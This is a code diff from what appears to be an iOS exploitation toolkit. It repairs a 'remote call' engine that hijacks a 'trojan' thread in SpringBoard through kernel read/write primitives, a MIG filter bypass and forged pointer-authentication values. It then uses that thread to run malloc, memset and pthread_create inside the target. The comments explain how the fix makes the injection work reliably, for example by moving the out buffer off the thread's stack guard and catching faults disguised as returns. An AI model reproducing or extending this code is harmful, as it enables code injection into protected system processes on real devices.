@@ -149,6 +149,16 @@ __thread uint64_t g_RC_bootstrapPid = 0;
 // paths, and the console has no way to tell them apart. Read by
 // remote_call_last_init_failure_detail.
 __thread int g_RC_callThreadStep = 0;
+// The PC of whatever arrived on the port second, i.e. where the thread was when the
+// call's "return" was delivered. A return is always the fake link register. Anything
+// else is a fault raised inside the function, and its x0 is a register the function
+// never set, which is a return value that means nothing.
+//
+// The raw value is kept as well as the stripped one because the whole point of the
+// stripped one is the comparison, and a comparison that cannot be explained from the
+// outside is not much of a measurement. Read by remote_call_last_init_failure_detail.
+__thread uint64_t g_RC_lastTempRetPC = 0;
+__thread uint64_t g_RC_lastTempRetPC_raw = 0;
 
 typedef struct RemoteCallState {
     uint64_t taskAddr;
@@ -334,9 +344,15 @@ const char *remote_call_last_init_failure_detail(void)
             case 7:  step = "port resolved to a non-kernel kobject"; break;
             case 8:  step = "no port and no inject thread[1] to reuse"; break;
             case 9:  step = "thread[1] invalid or is the signing thread"; break;
+            case 10: step = "no target buffer for the out pointer"; break;
+            case 11: step = "create faulted instead of returning"; break;
             default: step = "unclassified"; break;
         }
-        snprintf(detail, sizeof(detail), "callThread=%s", step);
+        snprintf(detail, sizeof(detail),
+                 "callThread=%s retPC=0x%llx raw=0x%llx want=0x%llx",
+                 step, (unsigned long long)g_RC_lastTempRetPC,
+                 (unsigned long long)g_RC_lastTempRetPC_raw,
+                 (unsigned long long)FAKE_LR_TROJAN_CREATOR);
         return detail;
     }
 
@@ -1510,6 +1526,8 @@ uint64_t do_remote_call_temp_internal(int timeout, const char *name,
             (unsigned long long)native_strip(exc2.threadState.__pc),
             (unsigned long long)native_strip(exc2.threadState.__lr),
             (unsigned long long)exc2.threadState.__x[0]);
+    g_RC_lastTempRetPC_raw = exc2.threadState.__pc;
+    g_RC_lastTempRetPC = native_strip(exc2.threadState.__pc);
     uint64_t retValue = exc2.threadState.__x[0];
     reply_with_state(&exc2, &exc2.threadState);
     if (remote_call_should_log_result(name, false))
@@ -2642,12 +2660,50 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     //   canary DEAD via remote_write, then SB-side memcpy bounce to heap
     //   (heap remap known-good) so we see what SB's MMU sees at out.
     uint64_t trapSP = (uint64_t)exc.threadState.__sp & 0x7fffffffffULL;
-    uint64_t trojanMemTemp = trapSP - 0x100ULL;
     g_RC_vmMap = task_get_vm_map(g_RC_taskAddr);
     g_RC_success = true;
-    RC_DIAG("Fl0rk out=SP-0x100: SP=0x%llx out=0x%llx vmMap=0x%llx",
+
+    // Where the pthread_t comes back to, and this is the fix: allocated in the
+    // target, not carved out of the trojan thread's stack.
+    //
+    // It used to be SP - 0x100, taken from the stack pointer of the exception that
+    // started all of this, on the reasoning that it is a scratch address. It is not
+    // scratch, it is BELOW the stack pointer, and on a Darwin userspace thread that
+    // is the guard gap: the range of the stack that is mapped PROT_NONE on purpose,
+    // so that a push past the frame faults instead of quietly writing through
+    // another frame. com.apple.main-thread is a pthread, so its stack has a guard,
+    // so SP - 0x100 is inside it.
+    //
+    // The history of this line, read backwards, is the argument. An earlier version
+    // saw *out come back 0 and concluded that OUR write was being remapped, then
+    // split the fault by bouncing through the target heap "so we see what SB's MMU
+    // sees at out". The heap bounce is the right instinct and it was applied to the
+    // reading half while the writing half kept pointing into the guard.
+    //
+    // A measured session then produced three facts that have one cause between them:
+    // the create returned 0, the out pointer read back 0, and no new thread appeared
+    // in SpringBoard's thread list. A successful pthread_create cannot produce that.
+    // A fault can produce all three. pthread_create writing its result to an unmapped
+    // address faults; the fault arrives on the same exception port the transport is
+    // already waiting on; the transport cannot tell a return from a fault and hands
+    // back x0, which is 0; and no thread was ever created. The bounce then does a
+    // memcpy from the same dead address, which faults too, so the buffer is still
+    // holding the memset value, which is also 0. Every observation, one cause.
+    //
+    // malloc in the target is the same call the bounce already makes and already
+    // trusts, and it puts both halves of the round trip on the same side of the
+    // process boundary.
+    uint64_t outBuf = 0;
+    if (g_RC_success) {
+        outBuf = do_remote_call_temp(100, "malloc", 16, 0, 0, 0, 0, 0, 0, 0);
+        if (g_RC_success && outBuf) {
+            do_remote_call_temp(100, "memset", outBuf, 0, 8, 0, 0, 0, 0, 0);
+        }
+    }
+    RC_DIAG("out buffer: SP=0x%llx old=SP-0x100=0x%llx new=malloc=0x%llx vmMap=0x%llx",
             (unsigned long long)trapSP,
-            (unsigned long long)trojanMemTemp,
+            (unsigned long long)(trapSP - 0x100ULL),
+            (unsigned long long)outBuf,
             (unsigned long long)g_RC_vmMap);
 
     uint64_t remoteCrashSigned = remote_pac(g_RC_trojanThreadAddr, FAKE_PC_TROJAN, 0);
@@ -2774,14 +2830,52 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
             return -1;
         }
 
+        if (!outBuf) {
+            g_RC_callThreadStep = 10;
+            RC_DIAG("no target out buffer for pthread_create_suspended_np");
+            fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
+            return -1;
+        }
+
         NSArray<NSNumber *> *threadsBefore = collect_all_task_threads(g_RC_taskAddr);
 
-        RC_DIAG("pthread_create_suspended_np start=%s 0x%llx out=SP-0x100=0x%llx (immediate)",
+        RC_DIAG("pthread_create_suspended_np start=%s 0x%llx out=0x%llx (target malloc)",
                 startKind, (unsigned long long)startRoutine,
-                (unsigned long long)trojanMemTemp);
+                (unsigned long long)outBuf);
 
         uint64_t createResult = do_remote_call_temp(100, "pthread_create_suspended_np",
-                                                    trojanMemTemp, 0, startRoutine, 0, 0, 0, 0, 0);
+                                                    outBuf, 0, startRoutine, 0, 0, 0, 0, 0);
+
+        // A return, or a fault, and the transport cannot tell them apart.
+        //
+        // do_remote_call_temp hands back x0 from whatever arrived on the port second,
+        // and a bad-access fault raised inside the function arrives on that same port
+        // with x0 holding whatever the function had loaded. It is then indistinguishable
+        // from a return, and this is the line that cost a session: a pthread_create
+        // that faulted instead of creating a thread reported a return value of 0,
+        // which is exactly what a successful pthread_create reports.
+        //
+        // A real return is the thread executing the instruction it returned to, which
+        // is the fake link register. That is the only PC that means "the function
+        // ran to completion and went home". Anything else means it did not, and the
+        // return value is a register the function never set, so nothing downstream
+        // can be trusted.
+        //
+        // Checked here and nowhere else on purpose. This call is the one that
+        // allocates memory, writes to a caller-supplied out pointer and has to come
+        // back for the whole engine to mean anything, and it is the one that has
+        // demonstrably been faulting. Making the check general would risk turning a
+        // working path into a named failure over a PC that is merely unusual.
+        if (g_RC_success &&
+            native_strip(g_RC_lastTempRetPC) != FAKE_LR_TROJAN_CREATOR) {
+            g_RC_callThreadStep = 11;
+            g_RC_lastTempRetPC_raw = g_RC_lastTempRetPC;
+            RC_DIAG("create did not return: retPC=0x%llx expected=0x%llx (fault, not a return)",
+                    (unsigned long long)native_strip(g_RC_lastTempRetPC),
+                    (unsigned long long)FAKE_LR_TROJAN_CREATOR);
+            fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
+            return -1;
+        }
         uint64_t pthreadAddr = 0;
         uint64_t newThreadAddr = 0;
         if (g_RC_success && createResult == 0) {
@@ -2789,16 +2883,16 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
             if (g_RC_success && heapBounce) {
                 // Zero via SB memset — no KRW write to bounce (avoids shmem poison).
                 do_remote_call_temp(100, "memset", heapBounce, 0, 8, 0, 0, 0, 0, 0);
-                do_remote_call_temp(100, "memcpy", heapBounce, trojanMemTemp, 8, 0, 0, 0, 0, 0);
+                do_remote_call_temp(100, "memcpy", heapBounce, outBuf, 8, 0, 0, 0, 0, 0);
                 clear_remote_shmem_cache();
                 pthreadAddr = remote_read64(heapBounce);
                 RC_DIAG("post-pthread out=0x%llx sb_via_bounce=0x%llx",
-                        (unsigned long long)trojanMemTemp,
+                        (unsigned long long)outBuf,
                         (unsigned long long)pthreadAddr);
                 do_remote_call_temp(100, "free", heapBounce, 0, 0, 0, 0, 0, 0, 0);
             } else {
                 clear_remote_shmem_cache();
-                pthreadAddr = remote_read64(trojanMemTemp);
+                pthreadAddr = remote_read64(outBuf);
                 RC_DIAG("post-pthread bounce miss — raw remapped read=0x%llx",
                         (unsigned long long)pthreadAddr);
             }
